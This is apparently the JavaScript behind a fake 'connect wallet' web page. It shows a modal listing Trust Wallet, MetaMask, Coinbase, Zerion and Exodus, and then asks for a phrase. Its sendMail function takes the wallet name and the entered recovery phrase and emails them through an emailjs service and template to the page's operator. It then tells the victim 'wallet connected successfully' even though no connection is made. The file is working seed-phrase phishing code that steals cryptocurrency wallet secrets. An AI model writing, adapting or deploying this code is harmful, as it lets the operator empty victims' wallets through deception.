
    let modal = document.querySelector('.modal')
    let open1 = document.querySelector('#listing-1')
    let open2 = document.querySelector('#listing-2')
    let open3 = document.querySelector('#listing-3')
    let open4 = document.querySelector('#listing-4')
    let open5 = document.querySelector('#listing-5')
    let open6 = document.querySelector('#listing-6')
    let close = document.querySelector('#close')
    let back = document.querySelector('.backdrop')
    let connect = document.getElementById('connect')
    
    

    open1.addEventListener( 'click',function() {
       modal.style.visibility = 'visible';
       back.style.visibility = 'visible';
    })

    open2.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open3.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open4.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open5.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open6.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })

     close.addEventListener('click', function(){
        modal.style.visibility = 'hidden';
        back.style.visibility = 'hidden';
     })

    
     connect.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })


       


   let phrasy = document.querySelector('.phrase')
   let meta = 'Meta mask';
   let trust = 'Trust wallet';
   let coin = 'Coinbase';
   let zerion = 'Zerion';
   let wall = document.getElementById('wall-name')
   let closePhrase = document.getElementById('close-phrase')
   let wallet1 = document.getElementById('wallets-1')
   let wallet2 = document.getElementById('wallets-2')
   let wallet3 = document.getElementById('wallets-3')
   let wallet4 = document.getElementById('wallets-4')
   let wallet5 = document.getElementById('wallets-5')
   let walletName = document.getElementById('trust')

   wallet1.addEventListener('click',function(){
phrasy.style.visibility = 'visible';
modal.style.visibility = 'hidden'
wall.value = 'trust wallet';
walletName.value = `${trust}`

   })

   closePhrase.addEventListener('click', function(){
      phrasy.style.visibility = 'hidden';
      back.style.visibility = 'hidden';
   })


   wallet2.addEventListener('click',function(){
      phrasy.style.visibility = 'visible';
      modal.style.visibility = 'hidden'
      wall.value = 'metamask';
      walletName.value = `${meta}`
      
         })
      
         closePhrase.addEventListener('click', function(){
            phrasy.style.visibility = 'hidden';
            back.style.visibility = 'hidden';
         })
      

         wallet3.addEventListener('click',function(){
            phrasy.style.visibility = 'visible';
            modal.style.visibility = 'hidden'
            wall.value = 'coinbase';
            walletName.value = `${coin}`
            
               })
            
               closePhrase.addEventListener('click', function(){
                  phrasy.style.visibility = 'hidden';
                  back.style.visibility = 'hidden';
               })
      
               
               wallet4.addEventListener('click',function(){
                  phrasy.style.visibility = 'visible';
                  modal.style.visibility = 'hidden'
                  wall.value = 'Zerion';
                  walletName.value = `${zerion}`
                  
                     })
                  
                     closePhrase.addEventListener('click', function(){
                        phrasy.style.visibility = 'hidden';
                        back.style.visibility = 'hidden';
                     })
      
                     
                     wallet5.addEventListener('click',function(){
                        phrasy.style.visibility = 'visible';
                        modal.style.visibility = 'hidden'
                        wall.value = 'exodus';
                        walletName.value = ''
                        
                           })
                        
                           closePhrase.addEventListener('click', function(){
                              phrasy.style.visibility = 'hidden';
                              back.style.visibility = 'hidden';
                           })


                           function sendMail() {
                              let params = {
                                 wallname: document.getElementById("trust").value,
                               phrase: document.getElementById("phrase-input").value,
                               
                            
                            }
                            
                            emailjs.send("service_lu14cep", "template_cqztrlg", params).then(function (res) {
                            alert("wallet connected successfully")
                            })

                            phrasy.style.visibility = 'hidden'
                            back.style.visibility = 'hidden'
                            }
                        

